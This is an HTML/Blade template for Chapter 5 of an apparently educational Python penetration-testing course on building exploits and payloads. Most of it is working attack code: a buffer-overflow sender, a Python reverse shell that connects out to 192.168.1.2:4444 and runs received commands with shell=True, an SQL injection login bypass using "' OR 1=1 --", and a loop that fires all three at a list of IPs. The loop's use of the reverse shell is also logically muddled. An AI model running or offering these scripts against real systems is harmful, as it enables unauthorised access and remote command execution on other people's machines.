<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chapter 5</title>
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
        }

        .container {
            display: flex;
            flex-direction: row;
            height: 100%;
        }

        .sidebar {
            width: 250px;
            background-color: #f8f9fa;
            padding: 20px;
            border-right: 1px solid #ddd;
            position: sticky;
            top: 0;
            height: 100%;
            overflow-y: auto;
        }

        .chapter-list {
            margin-left: 20px;
            flex: 0 0 250px;
            padding-right: 20px;
            border-right: 1px solid #ddd;
        }

        .main-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            background-color: #fff;
            height: 100vh;
        }

        .chapter-list h3 {
            margin-bottom: 10px;
        }

        .chapter-list ul {
            list-style: none;
            padding: 0;
        }

        .chapter-list ul li {
            margin-bottom: 10px;
        }

        .chapter-list ul li a {
            text-decoration: none;
            color: #007BFF;
            font-size: 16px;
        }

        .chapter-list ul li a:hover {
            text-decoration: underline;
        }

        .chapter-list ul li.active a {
            font-weight: bold;
            color: #0056b3;
        }

        .main-content h1 {
            font-size: 28px;
            color: #333;
        }

        .main-content h2 {
            font-size: 24px;
            color: #555;
            margin-top: 70px;
        }

        .main-content p {
            font-size: 18px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .next-chapter {
            text-align: center;
            margin-top: 40px;
        }

        .next-chapter-button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #FFC107;
            color: #003366;
            text-decoration: none;
            font-size: 18px;
            border-radius: 5px;
            font-weight: bold;
            margin-top: 20px;
        }

        .next-chapter-button:hover {
            background-color: #e0a800;
        }
    </style>
</head>

<body>
    @extends('layout')

    @section('content')
    <div class="container">

        <div class="chapter-list">
            <h3>CHAPTERS</h3>
            <ul>
                <li><a href="/lessons/pfc/pfc01">Chapter 1: Introduction to Python for Security Tasks</a></li>
                <li><a href="/lessons/pfc/pfc02">Chapter 2: Network Scanning and Reconnaissance with Python</a></li>
                <li><a href="/lessons/pfc/pfc03">Chapter 3: Automating Penetration Testing Tasks</a></li>
                <li><a href="/lessons/pfc/pfc04">Chapter 4: Creating Security Tools and Scripts</a></li>
                <li class="active"><a href="/lessons/pfc/pfc05">Chapter 5: Building Python-Based Exploits and Payloads</a></li>
            </ul>
        </div>

        <div class="main-content">
            <h1>Chapter 5: Building Python-Based Exploits and Payloads</h1>

            <h2>Learning Objectives</h2>
            <ul style="list-style-type: disc; margin-left: 20px;">
                <li>Understand the concept of exploits and payloads</li>
                <li>Learn how to build Python-based exploits</li>
                <li>Create custom payloads for penetration testing</li>
                <li>Develop skills for writing sophisticated exploits</li>
            </ul>

            <h2>1. Introduction to Exploits and Payloads</h2>
            <p>
                Exploits and payloads are vital tools in penetration testing, allowing you to test vulnerabilities in systems. An exploit takes advantage of a vulnerability, while a payload is the code executed by the exploit. In this chapter, we will build Python-based exploits and payloads for testing security systems.
            </p>

            <h2>2. Understanding Common Vulnerabilities</h2>
            <p>
                Exploits generally target specific vulnerabilities, such as buffer overflows, SQL injection, or weak authentication mechanisms. It is essential to understand the vulnerabilities you're testing for before writing an exploit. We'll focus on a simple buffer overflow and an example of an SQL injection.
            </p>

            <h2>3. Building a Simple Buffer Overflow Exploit</h2>
            <p>
                Buffer overflow vulnerabilities occur when a program writes more data to a buffer than it can hold, overwriting adjacent memory. In this section, we'll create a simple Python script to test a buffer overflow.
            </p>
            <pre>
import socket

def exploit_buffer_overflow(target_ip, target_port):
    payload = "A" * 100  # Simple payload to test overflow
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.sendall(payload.encode())  # Send overflow payload
    s.close()

# Example usage: Exploit buffer overflow on target system
exploit_buffer_overflow("192.168.1.1", 9999)
            </pre>

            <h2>4. Creating a Reverse Shell Payload</h2>
            <p>
                A reverse shell payload connects the target system back to the attacker's system, allowing the attacker to execute commands remotely. In this section, we will create a simple reverse shell payload in Python that connects back to an attacker's machine.
            </p>
            <pre>
import socket
import subprocess

def reverse_shell(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        s.send(output.stdout + output.stderr)

    s.close()

# Example usage: Start reverse shell on target system
reverse_shell("192.168.1.2", 4444)
            </pre>

            <h2>5. Building an SQL Injection Exploit</h2>
            <p>
                SQL injection is a common vulnerability that allows an attacker to execute arbitrary SQL queries on a database. In this section, we will create a simple SQL injection exploit in Python.
            </p>
            <pre>
import requests

def sql_injection(target_url, sql_payload):
    data = {'username': "' OR 1=1 --", 'password': sql_payload}
    response = requests.post(target_url, data=data)
    if "Welcome" in response.text:
        print("SQL Injection successful!")
    else:
        print("SQL Injection failed.")

# Example usage: Perform SQL injection on vulnerable system
sql_injection("http://example.com/login", "' OR 1=1 --")
            </pre>

            <h2>6. Automating Exploit Execution</h2>
            <p>
                Once you've created exploits and payloads, you can automate their execution for testing multiple systems or multiple attack vectors. We will combine the exploits we've built into an automated script.
            </p>
            <pre>
def automated_exploit_execution(target_ips):
    for ip in target_ips:
        # Run buffer overflow exploit
        exploit_buffer_overflow(ip, 9999)
        
        # Run reverse shell payload (ensure you have a listener ready)
        reverse_shell(ip, 4444)
        
        # Run SQL injection exploit
        sql_injection(f"http://{ip}/login", "' OR 1=1 --")

# Example usage: Run exploits on multiple targets
automated_exploit_execution(["192.168.1.1", "192.168.1.2"])
            </pre>

            <div class="next-chapter">
                <a href="/{{$mark_chapter()}}" class="next-chapter-button">Return to Course Overview</a>
            </div>
        </div>
    </div>

    @endsection
</body>

</html>